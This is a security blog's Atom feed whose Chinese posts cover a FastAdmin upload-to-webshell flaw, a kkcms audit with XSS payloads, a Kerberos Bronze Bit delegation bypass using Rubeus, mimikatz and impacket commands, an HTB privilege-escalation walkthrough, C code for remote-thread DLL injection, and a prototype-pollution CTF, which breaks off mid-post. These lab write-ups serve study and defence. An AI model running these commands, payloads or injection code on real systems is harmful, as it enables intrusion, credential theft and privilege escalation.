<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-04-03T16:22:36.829Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FastAdmin前台文件上传复现</title>
    <link href="http://422926799.github.io/posts/de1b4dd1.html"/>
    <id>http://422926799.github.io/posts/de1b4dd1.html</id>
    <published>2021-04-03T15:58:51.000Z</published>
    <updated>2021-04-03T16:22:36.829Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>漏洞发生于：2021年/4月1号<br>漏洞点：application\api\controller\Common.php<br>触发漏洞的url：/index/ajax/upload<br>要求：application\extra\upload.php里的chunking为true (分片上传为true)<br><img src="https://z3.ax1x.com/2021/04/04/cuYe9x.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞点分析<br>需要包括以下的post请求参数才行<br>1.chunkid参数<br>2.action参数<br>3.chunkindex参数<br>4.chunkcount参数<br>5.filename参数<br><img src="https://z3.ax1x.com/2021/04/04/cuYG4I.md.png" alt=""></p><p>随后进入if判断，当action参数不为merge或method不为clean的时候。调用chunk函数chunk($chunkid, $chunkindex, $chunkcount);进入分片文件上传<br><img src="https://z3.ax1x.com/2021/04/04/cuYDEj.md.png" alt=""></p><p>跟进chunk函数，<br>1.首先$destDir=RUNTIME_PATH/chunks路径, RUNTIME=ROOT_PATH . ‘runtime’ . DS (DS=根据系统的文件分隔符)<br><img src="https://z3.ax1x.com/2021/04/04/cuYrUs.md.png" alt=""></p><p>2.$fileName=$chunkid-$chunindex.part //$chunkid和$chunindex都可控<br>3.$destDir=$destDir.DS.$fileName //拼接得到最后文件路径<br>4.判断RUNTIME_PATH/chunks路径是否存在，不存在则创建文件夹<br>5.将临时文件移动到RUNTIME_PATH/chunks路径下<br><img src="https://z3.ax1x.com/2021/04/04/cuYhb4.md.png" alt=""></p><p>之后触发merge函数，写shell<br>要求action参数为merge<br><img src="https://z3.ax1x.com/2021/04/04/cutQzV.md.png" alt=""></p><p>首先chunkDir变量来自于下图<br>$chunkDir=RUNTIME_PATH . ‘chunks’<br><img src="https://z3.ax1x.com/2021/04/04/cut3sU.md.png" alt=""></p><p>1.$filePath=RUNTIME_PATH . ‘chunks’.DS.$chunkid //$chunkid参数可控<br>2.根据$chunkcount变量进行循环<br>3.判断$filePath-$i-.part文件是否存在<br>4.如果文件存在，在/runtime/chunks路径下创建以$filepath作为文件名的文件$destFile=@fopen($uploadPath, “wb”)<br>5.锁定文件<br>6.根据$chunkcount参数循环 //$chunkcount参数可控<br>7.$partFile=$filePath-$i-.part<br>8.循环读取$partFile内容，写入文件到$filepath<br>9.读取完文件后，删除分片文件，释放文件锁定，关闭文件句柄<br><img src="https://z3.ax1x.com/2021/04/04/cutDsO.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cutrLD.md.png" alt=""></p><p>exp分析:<br><img src="https://z3.ax1x.com/2021/04/04/cut2FA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cut4Qf.png" alt=""></p><p>exp地址:<a href="https://github.com/exp1orer/FastAdmin_Upload" target="_blank" rel="noopener">https://github.com/exp1orer/FastAdmin_Upload</a></p><p><img src="https://z3.ax1x.com/2021/04/04/cut5y8.png" alt=""></p><p>至于这里的shell地址为什么是根目录，因为这个exp是这么写的<br><img src="https://z3.ax1x.com/2021/04/04/cutjS0.md.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/57166400" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57166400</a><br><a href="https://xz.aliyun.com/t/9395" target="_blank" rel="noopener">https://xz.aliyun.com/t/9395</a><br><a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;漏洞发生于：2021年/4月1号&lt;br&gt;漏洞点：application\api\controller\Common.php&lt;br&gt;触发漏洞的</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>kkcms1.371代码审计</title>
    <link href="http://422926799.github.io/posts/de5a64f.html"/>
    <id>http://422926799.github.io/posts/de5a64f.html</id>
    <published>2021-03-30T16:49:39.000Z</published>
    <updated>2021-03-30T17:55:14.844Z</updated>
    
    <content type="html"><![CDATA[<p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p><h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p><ul><li>library.php 处理函数和单双引号转义处理</li><li>inc.php 引用了system目录里的所有文件</li></ul><h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p><p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p><p>可以看到，对所有的请求对单双引号进行了转义</p><pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {    exit(&#39;Request Error!&#39;);}if (!get_magic_quotes_gpc()) {    if (!empty($_GET)) {        $_GET = addslashes_deep($_GET);    }    if (!empty($_POST)) {        $_POST = addslashes_deep($_POST);    }    $_COOKIE = addslashes_deep($_COOKIE);    $_REQUEST = addslashes_deep($_REQUEST);}</code></pre><p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p><p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p><p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p><p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p><p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p><p>貌似payload并不会因为addslashes_deep函数而失效</p><p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p><p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p><p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p><p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p><p>留言板和这个差不多一致，省略</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p><h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p><p>总的来说，这套CMS有点水</p><p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的&lt;br&gt;but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询&lt;/p&gt;
&lt;h2 id=&quot;预处理分析&quot;&gt;&lt;a href=&quot;#预处理分析&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</title>
    <link href="http://422926799.github.io/posts/9cf32cdf.html"/>
    <id>http://422926799.github.io/posts/9cf32cdf.html</id>
    <published>2021-03-19T06:28:37.000Z</published>
    <updated>2021-03-19T06:45:06.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p><p>域用户:<br>fwwr<br>joke</p><h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p><p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p><p>常规的约束委派利用:</p><pre><code>1. 得到约束委派机器的用户凭证2. 发现委派用户委派的目标机器3. 获取RC4利用</code></pre><p>powerview查看约束委派的机器:</p><pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p><p>Rubeus一条命令实现约束委派：</p><pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p><p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p><pre><code>privilege::debugsekurlsa::&quot;ekeys&quot;</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p><p>获取TGT导入smbexec连接</p><pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardableexport KRB5CCNAME=administrator.ccachesudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p><h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p><p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p><p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p><pre><code>Import-Module .\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p><p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p><p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p><pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dllGet-ADComputer AttackerService #确认机器账户已经被添加Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器</code></pre><p>验证用户是否成功委派到目标机器</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p><p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p><pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardableexport KRB5CCNAME=administrator.ccachepython3 psexec.py -no-pass -k one2008.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;该漏洞解决了两个问题&lt;br&gt;1.禁止协议转换/协议过渡&lt;br&gt;2.受保护的用户和敏感用户不能被委派&lt;br&gt;具体设置表现为DC上设置Servi</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>HTB laboratory</title>
    <link href="http://422926799.github.io/posts/2ee11a81.html"/>
    <id>http://422926799.github.io/posts/2ee11a81.html</id>
    <published>2021-03-18T05:29:21.000Z</published>
    <updated>2021-03-18T05:37:22.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p><pre><code>nmap -sC -sV 10.10.10.216</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqiSe.png" alt=""></p><p>从扫描结果能看到，有两个域</p><pre><code>laboratory.htbgit.laboratory.htb</code></pre><p>加入/etc/hosts<br><img src="https://s3.ax1x.com/2021/03/18/6gqFQH.png" alt=""></p><p>访问<code>laboratory.htb</code>发现就一个静态，拉倒下面有三个用户名。先记录下来<br><img src="https://s3.ax1x.com/2021/03/18/6gqAOA.md.png" alt=""></p><p>访问<code>git.laboratory.htb</code>是一个gitlab，注册gitlab发现版本<br>（ps:这里注册gitlab用他域做邮箱域：<a href="mailto:`joker@laboratory.htb" target="_blank" rel="noopener">`joker@laboratory.htb</a>`，不然会注册失败）<br><img src="https://s3.ax1x.com/2021/03/18/6gqeTP.png" alt=""></p><p>![](<a href="https://s3.ax1x.com/2021/03/18/6gqnFf.png" target="_blank" rel="noopener">https://s3.ax1x.com/2021/03/18/6gqnFf.png</a></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>搜索gitlab对应的版本发现存在RCE,msf用对应的利用工具<br><img src="https://s3.ax1x.com/2021/03/18/6gqB6J.png" alt=""></p><p>查看刚刚收集到的用户名，发现Dexter是CEO。修改他的密码<br><img src="https://s3.ax1x.com/2021/03/18/6gqDX9.png" alt=""></p><p>登录它的gitlab发现有id_rsa<br><img src="https://s3.ax1x.com/2021/03/18/6gqsmR.png" alt=""></p><p>ssh连接得到user.txt<br><img src="https://s3.ax1x.com/2021/03/18/6gq46H.png" alt=""></p><p><img src="img/user.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid查找发现存在个docker-security。strings查看，发现有执行命令chmod。利用劫持提权</p><pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/chmodchmod 777 /tmp/chmodexport PATH=/tmp:$PATH</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqqtf.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;常规nmap扫描&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sC -sV 10.10.10.216
&lt;/code&gt;&lt;/pre</summary>
      
    
    
    
    
    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>远程线程注入(系统进程)</title>
    <link href="http://422926799.github.io/posts/b76f927c.html"/>
    <id>http://422926799.github.io/posts/b76f927c.html</id>
    <published>2021-03-14T15:57:27.000Z</published>
    <updated>2021-03-14T16:07:12.399Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>CreateRemoteThread</li></ul><p>特权开启：</p><ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p><pre><code class="C">bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}</code></pre><p>完整代码</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}int main(){        int pid = 1148;        EnbalePrivileges();        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;        int dllnamesize = strlen(dllname) * 2;        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);        if (pidmodule == NULL) {               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);        if (vaeAddr == NULL) {               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);        if (loadaddress == NULL) {               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);        if (runthread == NULL) {               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());        }        printf(&quot;CreateRemoteThread Sucess\n&quot;);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到&lt;br&gt;系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。&lt;br&gt;然后联想到是不是权限</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>js源链污染</title>
    <link href="http://422926799.github.io/posts/3e45dbe4.html"/>
    <id>http://422926799.github.io/posts/3e45dbe4.html</id>
    <published>2021-03-10T11:52:49.000Z</published>
    <updated>2021-03-10T12:10:55.095Z</updated>
    
    <content type="html"><![CDATA[<p>题目考的目的:js原链污染</p><h2 id="js原链污染简介"><a href="#js原链污染简介" class="headerlink" title="js原链污染简介"></a>js原链污染简介</h2><blockquote><p>JavaScript是一门灵活的语言，基于原型实现继承，原型是Javascript的继承的基础。<br>它本身不提供一个 class实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的<br>遵循ECMAScript标准，someObject.[[Prototype]] 符号是用于指向 someObject 的原型。从 ECMAScript 6 开始，[[Prototype]] 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <strong>proto</strong></p></blockquote><p>每个实例对象都有一个私有属性<strong>proto</strong>指向它的构造函数的原型prototype，也就是</p><pre><code class="javascript">function a(){    this.a=&quot;AAA&quot;}b=new a()b.__proto__===a.Prototype</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6Jvp9S.png" alt=""><br>原型prototype是类的一个属性，而这个<strong>属性中的值和方法被每一个由类实例出来的对象所共有</strong>，而我们可以通过实例对象<code>test1.__proto__</code>来访问Test类的原型，那么这样就出现了一个问题，<strong>假如我们可以控制实例对象的<code>__proto__</code>属性，则等于可以修改该类所有实例对象的<code>__proto__</code>属性。</strong><br><img src="https://s3.ax1x.com/2021/03/10/6JvL2F.png" alt="网上的图"></p><h2 id="js原链污染测试"><a href="#js原链污染测试" class="headerlink" title="js原链污染测试"></a>js原链污染测试</h2><p>定义一个对象测试</p><pre><code class="javascript">challenger={&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;age&quot;:80}key={}challenger.__proto__.pwd2=&quot;pwd&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6JvVA0.png" alt=""></p><p>由于源链被污染，定义的pwd2值在任何地方都可以被访问到<br><img src="https://s3.ax1x.com/2021/03/10/6JvA7q.png" alt=""></p><p>更直接的表明<br><img src="https://s3.ax1x.com/2021/03/10/6Jvlu9.png" alt=""></p><p>非对象污染则会失败<br><img src="https://s3.ax1x.com/2021/03/10/6Jv3H1.png" alt=""></p><p>but，实际上的源链污染需要找到对应能操控对象的函数来进行污染</p><h2 id="bugkuctf-sodirty题目分析"><a href="#bugkuctf-sodirty题目分析" class="headerlink" title="bugkuctf sodirty题目分析"></a>bugkuctf sodirty题目分析</h2><p>源码如下:</p><pre><code class="javascript">var express = require(&#39;express&#39;);const setFn = require(&#39;set-value&#39;);var router = express.Router();const Admin = {    &quot;password&quot;:process.env.password?process.env.password:&quot;password&quot;}router.post(&quot;/getflag&quot;, function (req, res, next) {    if (req.body.password === undefined || req.body.password === req.session.challenger.password){        res.send(&quot;登录失败&quot;);    }else{        if(req.session.challenger.age &gt; 79){            res.send(&quot;糟老头子坏滴很&quot;);        }        let key = req.body.key.toString();        let password = req.body.password.toString();        if(Admin[key] === password){            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);        }else {            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);        }    }});router.get(&#39;/reg&#39;, function (req, res, next) {    req.session.challenger = {        &quot;username&quot;: &quot;user&quot;,        &quot;password&quot;: &quot;pass&quot;,        &quot;age&quot;: 80    }    res.send(&quot;用户创建成功!&quot;);});router.get(&#39;/&#39;, function (req, res, next) {    res.redirect(&#39;index&#39;);});router.get(&#39;/index&#39;, function (req, res, next) {    res.send(&#39;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#39;);});router.post(&quot;/update&quot;, function (req, res, next) {    if(req.session.challenger === undefined){        res.redirect(&#39;/reg&#39;);    }else{        if (req.body.attrkey === undefined || req.body.attrval === undefined) {            res.send(&quot;传参有误&quot;);        }else {            let key = req.body.attrkey.toString();            let value = req.body.attrval.toString();            setFn(req.session.challenger, key, value);            res.send(&quot;修改成功&quot;);        }    }});module.exports = router;</code></pre><p>分析流程:</p><pre><code class="text">/路径：1.重定向到/reg路径/reg路径:创建一个req.session.challenger对象/update路径:1.req.session.challenger如果为空则被重定向到/reg路径    2.req.body.attrkey或req.body.attrval为undefined的情况下返回为&quot;传参有误&quot;    2.如果不为undefined将设置key和value，调用setFn函数设置req.session.challenger对象的值传参链:req.body.attrkey/req.body.attrval-&gt;let key = 